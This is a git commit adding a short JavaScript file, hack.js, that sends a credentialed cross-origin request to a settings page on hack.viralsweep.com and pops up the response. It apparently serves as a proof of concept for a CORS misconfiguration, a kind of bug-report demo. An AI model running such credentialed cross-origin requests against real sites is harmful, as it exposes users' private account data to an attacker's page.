ba6fa3a98ef893b1bab4aadb2aa5646fda028e96
hacky4594 <hacky4594@gmail.com>
2017-01-18 23:17:02 +0530

    Create hack.js

---
+++ hack.js
@@ -0,0 +1,15 @@
+function damm(){
+var http;
+
+http = new XMLHttpRequest();
+http.open("GET","https://hack.viralsweep.com/settings",true);
+http.setRequestHeader('Content-Type','text/plain');
+http.withCredentials = "true";
+http.onreadystatechange = function(){
+		alert(http.responseText);
+	if(http.readystate == 4){
+	}
+}
+http.send();
+}
+damm();
